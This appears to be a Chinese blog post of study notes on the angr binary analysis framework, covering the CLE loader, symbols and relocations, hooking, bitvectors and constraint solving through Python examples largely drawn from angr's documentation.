<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.analyses.            <span class="comment"># Press TAB here in ipython to get an autocomplete-listing of everything:</span></span><br><span class="line"> proj.analyses.BackwardSlice        proj.analyses.CongruencyCheck      </span><br><span class="line"> proj.analyses.reload_analyses    proj.analyses.BinaryOptimizer      </span><br><span class="line"> proj.analyses.DDG                  proj.analyses.StaticHooker</span><br><span class="line"> proj.analyses.BinDiff              proj.analyses.DFG                  </span><br><span class="line"> proj.analyses.VariableRecovery    proj.analyses.BoyScout             </span><br><span class="line"> proj.analyses.Disassembly          proj.analyses.VariableRecoveryFast</span><br><span class="line"> proj.analyses.CDG                  proj.analyses.GirlScout            </span><br><span class="line"> proj.analyses.Veritesting      proj.analyses.CFG                  </span><br><span class="line"> proj.analyses.Identifier           proj.analyses.VFG</span><br><span class="line"> proj.analyses.CFGEmulated          proj.analyses.LoopFinder           </span><br><span class="line"> proj.analyses.VSA_DDG        proj.analyses.CFGFast              </span><br><span class="line"> proj.analyses.Reassembler</span><br></pre></td></tr></table></figure>
<p>（未必准确的解释，后续慢慢验证）</p>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231024094301794-16981317832354.png" alt="image-20231024094301794"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>, auto_load_libs=<span class="literal">False</span>) <span class="comment"># 不加载所有依赖的外部动态链接库，防止出现额外开销以及库不兼容的报错等等问题</span></span><br><span class="line">cfg = proj.analyses.CFGFast()</span><br><span class="line"><span class="built_in">print</span>(cfg)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(cfg.graph.nodes())</span><br><span class="line">entry_node = cfg.get_any_node(proj.entry)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(entry_node)</span><br></pre></td></tr></table></figure>
<p><img loading="lazy" data-src="angr%E5%88%9D%E6%8E%A2/image-20231024095601415-16981317771273.png" alt="image-20231024095601415"></p>
<h4 id="the-loader"><a class="markdownIt-Anchor" href="#the-loader">#</a> The Loader</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># All loaded objects</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.loader.all_objects</span><br><span class="line">[&lt;ELF Object fauxware, maps [<span class="number">0x400000</span>:<span class="number">0x60105f</span>]&gt;,</span><br><span class="line"> &lt;ELF Object libc-<span class="number">2.23</span>.so, maps [<span class="number">0x1000000</span>:<span class="number">0x13c999f</span>]&gt;,</span><br><span class="line"> &lt;ELF Object ld-<span class="number">2.23</span>.so, maps [<span class="number">0x2000000</span>:<span class="number">0x2227167</span>]&gt;,</span><br><span class="line"> &lt;ELFTLSObject Object cle<span class="comment">##tls, maps [0x3000000:0x3015010]&gt;,</span></span><br><span class="line"> &lt;ExternObject Object cle<span class="comment">##externs, maps [0x4000000:0x4008000]&gt;,</span></span><br><span class="line"> &lt;KernelObject Object cle<span class="comment">##kernel, maps [0x5000000:0x5008000]&gt;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is the &quot;main&quot; object, the one that you directly specified when loading the project</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.loader.main_object</span><br><span class="line">&lt;ELF Object fauxware, maps [<span class="number">0x400000</span>:<span class="number">0x60105f</span>]&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a dictionary mapping from shared object name to object</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.loader.shared_objects</span><br><span class="line">&#123; <span class="string">&#x27;fauxware&#x27;</span>: &lt;ELF Object fauxware, maps [<span class="number">0x400000</span>:<span class="number">0x60105f</span>]&gt;,</span><br><span class="line">  <span class="string">&#x27;libc.so.6&#x27;</span>: &lt;ELF Object libc-<span class="number">2.23</span>.so, maps [<span class="number">0x1000000</span>:<span class="number">0x13c999f</span>]&gt;,</span><br><span class="line">  <span class="string">&#x27;ld-linux-x86-64.so.2&#x27;</span>: &lt;ELF Object ld-<span class="number">2.23</span>.so, maps [<span class="number">0x2000000</span>:<span class="number">0x2227167</span>]&gt; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Here&#x27;s all the objects that were loaded from ELF files</span></span><br><span class="line"><span class="comment"># If this were a windows program we&#x27;d use all_pe_objects!</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.loader.all_elf_objects</span><br><span class="line">[&lt;ELF Object fauxware, maps [<span class="number">0x400000</span>:<span class="number">0x60105f</span>]&gt;,</span><br><span class="line"> &lt;ELF Object libc-<span class="number">2.23</span>.so, maps [<span class="number">0x1000000</span>:<span class="number">0x13c999f</span>]&gt;,</span><br><span class="line"> &lt;ELF Object ld-<span class="number">2.23</span>.so, maps [<span class="number">0x2000000</span>:<span class="number">0x2227167</span>]&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Here&#x27;s the &quot;externs object&quot;, which we use to provide addresses for unresolved imports and angr internals</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.loader.extern_object</span><br><span class="line">&lt;ExternObject Object cle<span class="comment">##externs, maps [0x4000000:0x4008000]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This object is used to provide addresses for emulated syscalls</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.loader.kernel_object</span><br><span class="line">&lt;KernelObject Object cle<span class="comment">##kernel, maps [0x5000000:0x5008000]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally, you can to get a reference to an object given an address in it</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.loader.find_object_containing(<span class="number">0x400000</span>)</span><br><span class="line">&lt;ELF Object fauxware, maps [<span class="number">0x400000</span>:<span class="number">0x60105f</span>]&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>obj = proj.loader.main_object</span><br><span class="line"></span><br><span class="line"><span class="comment"># The entry point of the object</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>obj.entry</span><br><span class="line"><span class="number">0x400580</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>obj.min_addr, obj.max_addr</span><br><span class="line">(<span class="number">0x400000</span>, <span class="number">0x60105f</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve this ELF&#x27;s segments and sections</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>obj.segments</span><br><span class="line">&lt;Regions: [&lt;ELFSegment memsize=<span class="number">0xa74</span>, filesize=<span class="number">0xa74</span>, vaddr=<span class="number">0x400000</span>, flags=<span class="number">0x5</span>, offset=<span class="number">0x0</span>&gt;,</span><br><span class="line">           &lt;ELFSegment memsize=<span class="number">0x238</span>, filesize=<span class="number">0x228</span>, vaddr=<span class="number">0x600e28</span>, flags=<span class="number">0x6</span>, offset=<span class="number">0xe28</span>&gt;]&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>obj.sections</span><br><span class="line">&lt;Regions: [&lt;Unnamed | offset <span class="number">0x0</span>, vaddr <span class="number">0x0</span>, size <span class="number">0x0</span>&gt;,</span><br><span class="line">           &lt;.interp | offset <span class="number">0x238</span>, vaddr <span class="number">0x400238</span>, size <span class="number">0x1c</span>&gt;,</span><br><span class="line">           &lt;.note.ABI-tag | offset <span class="number">0x254</span>, vaddr <span class="number">0x400254</span>, size <span class="number">0x20</span>&gt;,</span><br><span class="line">            ...etc</span><br><span class="line"></span><br><span class="line"><span class="comment"># You can get an individual segment or section by an address it contains:</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>obj.find_segment_containing(obj.entry)</span><br><span class="line">&lt;ELFSegment memsize=<span class="number">0xa74</span>, filesize=<span class="number">0xa74</span>, vaddr=<span class="number">0x400000</span>, flags=<span class="number">0x5</span>, offset=<span class="number">0x0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>obj.find_section_containing(obj.entry)</span><br><span class="line">&lt;.text | offset <span class="number">0x580</span>, vaddr <span class="number">0x400580</span>, size <span class="number">0x338</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the address of the PLT stub for a symbol</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>addr = obj.plt[<span class="string">&#x27;strcmp&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>addr</span><br><span class="line"><span class="number">0x400550</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>obj.reverse_plt[addr]</span><br><span class="line"><span class="string">&#x27;strcmp&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show the prelinked base of the object and the location it was actually mapped into memory by CLE</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>obj.linked_base</span><br><span class="line"><span class="number">0x400000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>obj.mapped_base</span><br><span class="line"><span class="number">0x400000</span></span><br></pre></td></tr></table></figure>
<h4 id="symbols-and-relocations"><a class="markdownIt-Anchor" href="#symbols-and-relocations">#</a> Symbols and Relocations</h4>
<p>CLE 寻找符号地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>strcmp = proj.loader.find_symbol(<span class="string">&#x27;strcmp&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>strcmp</span><br><span class="line">&lt;Symbol <span class="string">&quot;strcmp&quot;</span> <span class="keyword">in</span> libc.so<span class="number">.6</span> at <span class="number">0x1089cd0</span>&gt;</span><br></pre></td></tr></table></figure>
<p>The Symbol object has three ways of reporting its address:</p>
<ul>
<li><code>.rebased_addr</code>  is its address in the global address space. This is what is shown in the print output.</li>
<li><code>.linked_addr</code>  is its address relative to the prelinked base of the binary. This is the address reported in, for example,  <code>readelf(1)</code> .</li>
<li><code>.relative_addr</code>  is its address relative to the object base. This is known in the literature (particularly the Windows literature) as an RVA (relative virtual address).</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>strcmp.name</span><br><span class="line"><span class="string">&#x27;strcmp&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>strcmp.owner</span><br><span class="line">&lt;ELF Object libc-<span class="number">2.23</span>.so, maps [<span class="number">0x1000000</span>:<span class="number">0x13c999f</span>]&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>strcmp.rebased_addr <span class="comment"># 进程虚拟内存中的地址</span></span><br><span class="line"><span class="number">0x1089cd0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>strcmp.linked_addr <span class="comment">#链接时分配的地址</span></span><br><span class="line"><span class="number">0x89cd0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>strcmp.relative_addr <span class="comment"># 被加载到的预定基地址</span></span><br><span class="line"><span class="number">0x89cd0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>strcmp.is_export</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>strcmp.is_import</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># On Loader, the method is find_symbol because it performs a search operation to find the symbol.</span></span><br><span class="line"><span class="comment"># On an individual object, the method is get_symbol because there can only be one symbol with a given name.</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>main_strcmp = proj.loader.main_object.get_symbol(<span class="string">&#x27;strcmp&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>main_strcmp</span><br><span class="line">&lt;Symbol <span class="string">&quot;strcmp&quot;</span> <span class="keyword">in</span> fauxware (<span class="keyword">import</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>main_strcmp.is_export</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>main_strcmp.is_import</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>main_strcmp.resolvedby</span><br><span class="line">&lt;Symbol <span class="string">&quot;strcmp&quot;</span> <span class="keyword">in</span> libc.so<span class="number">.6</span> at <span class="number">0x1089cd0</span>&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Relocations don&#x27;t have a good pretty-printing, so those addresses are Python-internal, unrelated to our program</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.loader.shared_objects[<span class="string">&#x27;libc.so.6&#x27;</span>].imports</span><br><span class="line">&#123;<span class="string">&#x27;__libc_enable_secure&#x27;</span>: &lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at <span class="number">0x7ff5c5fce780</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;__tls_get_addr&#x27;</span>: &lt;cle.backends.elf.relocation.amd64.R_X86_64_JUMP_SLOT at <span class="number">0x7ff5c6018358</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_dl_argv&#x27;</span>: &lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at <span class="number">0x7ff5c5fd2e48</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_dl_find_dso_for_object&#x27;</span>: &lt;cle.backends.elf.relocation.amd64.R_X86_64_JUMP_SLOT at <span class="number">0x7ff5c6018588</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_dl_starting_up&#x27;</span>: &lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at <span class="number">0x7ff5c5fd2550</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_rtld_global&#x27;</span>: &lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at <span class="number">0x7ff5c5fce4e0</span>&gt;,</span><br><span class="line"> <span class="string">&#x27;_rtld_global_ro&#x27;</span>: &lt;cle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at <span class="number">0x7ff5c5fcea20</span>&gt;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="loading-options"><a class="markdownIt-Anchor" href="#loading-options">#</a> Loading Options</h4>
<p>If you are loading something with  <code>angr.Project</code>  and you want to pass an option to the  <code>cle.Loader</code>  instance that Project implicitly creates, you can just pass the keyword argument directly to the Project constructor, and it will be passed on to CLE. You should look at the <a href="https://docs.angr.io/projects/cle/en/latest/api.html">CLE API docs.</a> if you want to know everything that could possibly be passed in as an option, but we will go over some important and frequently used options here.</p>
<p>We’ve discussed  <code>auto_load_libs</code>  already - it enables or disables CLE’s attempt to automatically resolve shared library dependencies, and is on by default. Additionally, there is the opposite,  <code>except_missing_libs</code> , which, if set to true, will cause an exception to be thrown whenever a binary has a shared library dependency that cannot be resolved.</p>
<p>You can pass a list of strings to  <code>force_load_libs</code>  and anything listed will be treated as an unresolved shared library dependency right out of the gate, or you can pass a list of strings to  <code>skip_libs</code>  to prevent any library of that name from being resolved as a dependency. Additionally, you can pass a list of strings (or a single string) to  <code>ld_path</code> , which will be used as an additional search path for shared libraries, before any of the defaults: the same directory as the loaded program, the current working directory, and your system libraries.</p>
<p>If you want to specify some options that only apply to a specific binary object, CLE will let you do that too. The parameters  <code>main_opts</code>  and  <code>lib_opts</code>  do this by taking dictionaries of options.  <code>main_opts</code>  is a mapping from option names to option values, while  <code>lib_opts</code>  is a mapping from library name to dictionaries mapping option names to option values.</p>
<p>The options that you can use vary from backend to backend, but some common ones are:</p>
<ul>
<li><code>backend</code>  - which backend to use, as either a class or a name</li>
<li><code>base_addr</code>  - a base address to use</li>
<li><code>entry_point</code>  - an entry point to use</li>
<li><code>arch</code>  - the name of an architecture to use</li>
</ul>
<p>Example:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>angr.Project(<span class="string">&#x27;examples/fauxware/fauxware&#x27;</span>, main_opts=&#123;<span class="string">&#x27;backend&#x27;</span>: <span class="string">&#x27;blob&#x27;</span>, <span class="string">&#x27;arch&#x27;</span>: <span class="string">&#x27;i386&#x27;</span>&#125;, lib_opts=&#123;<span class="string">&#x27;libc.so.6&#x27;</span>: &#123;<span class="string">&#x27;backend&#x27;</span>: <span class="string">&#x27;elf&#x27;</span>&#125;&#125;)</span><br><span class="line">&lt;Project examples/fauxware/fauxware&gt;</span><br></pre></td></tr></table></figure>
<h4 id="symbolic-function-summaries"><a class="markdownIt-Anchor" href="#symbolic-function-summaries">#</a> Symbolic Function Summaries</h4>
<p><a href="https://github.com/angr/angr/tree/master/angr/procedures">angr/angr/procedures at master · angr/angr (github.com)</a></p>
<h4 id="hook"><a class="markdownIt-Anchor" href="#hook">#</a> hook</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The mechanism by which angr replaces library code with a Python summary is called hooking, and you can do it too! When performing simulation, at every step angr checks if the current address has been hooked, and if so, runs the hook instead of the binary code at that address. The API to let you do this is proj.hook(addr, hook), where hook is a SimProcedure instance. You can manage your project’s hooks with .is_hooked, .unhook, and .hooked_by, which should hopefully not require explanation.</span><br><span class="line"></span><br><span class="line">There is an alternate API for hooking an address that lets you specify your own off-the-cuff function to use as a hook, by using proj.hook(addr) as a function decorator. If you do this, you can also optionally specify a length keyword argument to make execution jump some number of bytes forward after your hook finishes.</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stub_func = angr.SIM_PROCEDURES[<span class="string">&#x27;stubs&#x27;</span>][<span class="string">&#x27;ReturnUnconstrained&#x27;</span>] <span class="comment"># this is a CLASS</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.hook(<span class="number">0x10000</span>, stub_func())  <span class="comment"># hook with an instance of the class</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.is_hooked(<span class="number">0x10000</span>)            <span class="comment"># these functions should be pretty self-explanitory</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.hooked_by(<span class="number">0x10000</span>)</span><br><span class="line">&lt;ReturnUnconstrained&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.unhook(<span class="number">0x10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>@proj.hook(<span class="number">0x20000</span>, length=<span class="number">5</span>)</span><br><span class="line"><span class="meta">... </span><span class="keyword">def</span> <span class="title function_">my_hook</span>(<span class="params">state</span>):</span><br><span class="line"><span class="meta">... </span>    state.regs.rax = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>proj.is_hooked(<span class="number">0x20000</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p>可以尝试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@proj.hook(<span class="params">proj.entry</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_hook</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;startttttttt!!!!!!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">simgr = proj.factory.simulation_manager(state)</span><br><span class="line">simgr.run()</span><br><span class="line"></span><br><span class="line"><span class="comment"># startttttttt!!!!!!!!</span></span><br></pre></td></tr></table></figure>
<p>然后可以进行 hook 修改寄存器等操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simulation_manager(state)</span><br><span class="line"><span class="built_in">print</span>(simgr.active[<span class="number">0</span>].regs.eax)</span><br><span class="line"></span><br><span class="line"><span class="meta">@proj.hook(<span class="params">proj.entry</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_hook</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;startttttttt!!!!!!!!&#x27;</span>)</span><br><span class="line">    simgr.active[<span class="number">0</span>].regs.eax = state.solver.BVV(<span class="number">0x1111</span>, <span class="number">32</span>)</span><br><span class="line">    <span class="built_in">print</span>(simgr.active[<span class="number">0</span>].regs.eax)</span><br><span class="line">    </span><br><span class="line">simgr.run()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;BV32 0x1c&gt;</span></span><br><span class="line"><span class="string">startttttttt!!!!!!!!</span></span><br><span class="line"><span class="string">&lt;BV32 0x1111&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="符号样例"><a class="markdownIt-Anchor" href="#符号样例">#</a> 符号样例</h3>
<h4 id="bitvectors"><a class="markdownIt-Anchor" href="#bitvectors">#</a> Bitvectors</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>one = state.solver.BVV(<span class="number">1</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>one</span><br><span class="line"> &lt;BV64 <span class="number">0x1</span>&gt;</span><br><span class="line"><span class="comment"># Create a bitvector symbol named &quot;x&quot; of length 64 bits</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = state.solver.BVS(<span class="string">&quot;x&quot;</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line">&lt;BV64 x_9_64&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y = state.solver.BVS(<span class="string">&quot;y&quot;</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y</span><br><span class="line">&lt;BV64 y_10_64&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x + one</span><br><span class="line">&lt;BV64 x_9_64 + <span class="number">0x1</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(x + one) / <span class="number">2</span></span><br><span class="line">&lt;BV64 (x_9_64 + <span class="number">0x1</span>) / <span class="number">0x2</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x - y</span><br><span class="line">&lt;BV64 x_9_64 - y_10_64&gt;</span><br></pre></td></tr></table></figure>
<p>可以通过 ASTs 分析</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree = (x + <span class="number">1</span>) / (y + <span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree</span><br><span class="line">&lt;BV64 (x_9_64 + <span class="number">0x1</span>) / (y_10_64 + <span class="number">0x2</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree.op</span><br><span class="line"><span class="string">&#x27;__floordiv__&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree.args</span><br><span class="line">(&lt;BV64 x_9_64 + <span class="number">0x1</span>&gt;, &lt;BV64 y_10_64 + <span class="number">0x2</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree.args[<span class="number">0</span>].op</span><br><span class="line"><span class="string">&#x27;__add__&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree.args[<span class="number">0</span>].args</span><br><span class="line">(&lt;BV64 x_9_64&gt;, &lt;BV64 <span class="number">0x1</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree.args[<span class="number">0</span>].args[<span class="number">1</span>].op</span><br><span class="line"><span class="string">&#x27;BVV&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree.args[<span class="number">0</span>].args[<span class="number">1</span>].args</span><br><span class="line">(<span class="number">1</span>, <span class="number">64</span>)</span><br></pre></td></tr></table></figure>
<h4 id="symbolic-constraints"><a class="markdownIt-Anchor" href="#symbolic-constraints">#</a> Symbolic Constraints</h4>
<p>Performing comparison operations between any two similarly-typed ASTs will yield another AST - not a bitvector, but now a symbolic boolean.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x == <span class="number">1</span></span><br><span class="line">&lt;Bool x_9_64 == <span class="number">0x1</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x == one</span><br><span class="line">&lt;Bool x_9_64 == <span class="number">0x1</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x &gt; <span class="number">2</span></span><br><span class="line">&lt;Bool x_9_64 &gt; <span class="number">0x2</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x + y == one_hundred + <span class="number">5</span></span><br><span class="line">&lt;Bool (x_9_64 + y_10_64) == <span class="number">0x69</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>one_hundred &gt; <span class="number">5</span></span><br><span class="line">&lt;Bool <span class="literal">True</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>one_hundred &gt; -<span class="number">5</span> <span class="comment"># One tidbit you can see from this is that the comparisons are unsigned by default. The -5 in the last example is coerced to &lt;BV64 0xfffffffffffffffb&gt;, which is definitely not less than one hundred. </span></span><br><span class="line"><span class="comment"># signed : one_hundred.SGT(-5)</span></span><br><span class="line">&lt;Bool <span class="literal">False</span>&gt;</span><br></pre></td></tr></table></figure>
<p>判断</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yes = one == <span class="number">1</span></span><br><span class="line">no = one == <span class="number">2</span></span><br><span class="line">maybe = x == y</span><br><span class="line">state.solver.is_true(yes)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">state.solver.is_false(yes)</span><br><span class="line"><span class="literal">False</span></span><br><span class="line">state.solver.is_true(no)</span><br><span class="line"><span class="literal">False</span></span><br><span class="line">state.solver.is_false(no)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">state.solver.is_true(maybe)</span><br><span class="line"><span class="literal">False</span></span><br><span class="line">state.solver.is_false(maybe)</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>
<h4 id="constraint-solving"><a class="markdownIt-Anchor" href="#constraint-solving">#</a> Constraint Solving</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.add(x &gt; y)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.add(y &gt; <span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.add(<span class="number">10</span> &gt; x)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.<span class="built_in">eval</span>(x)</span><br><span class="line"><span class="number">4</span> <span class="comment"># result might vary</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get a fresh state without constraints</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">input</span> = state.solver.BVS(<span class="string">&#x27;input&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>operation = (((<span class="built_in">input</span> + <span class="number">4</span>) * <span class="number">3</span>) &gt;&gt; <span class="number">1</span>) + <span class="built_in">input</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>output = <span class="number">200</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.add(operation == output)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.<span class="built_in">eval</span>(<span class="built_in">input</span>)</span><br><span class="line"><span class="number">0x3333333333333381</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.add(<span class="built_in">input</span> &lt; <span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.satisfiable()</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fresh state</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.add(x - y &gt;= <span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.add(y &gt; <span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.<span class="built_in">eval</span>(x)</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.<span class="built_in">eval</span>(y)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>state.solver.<span class="built_in">eval</span>(x + y)</span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>
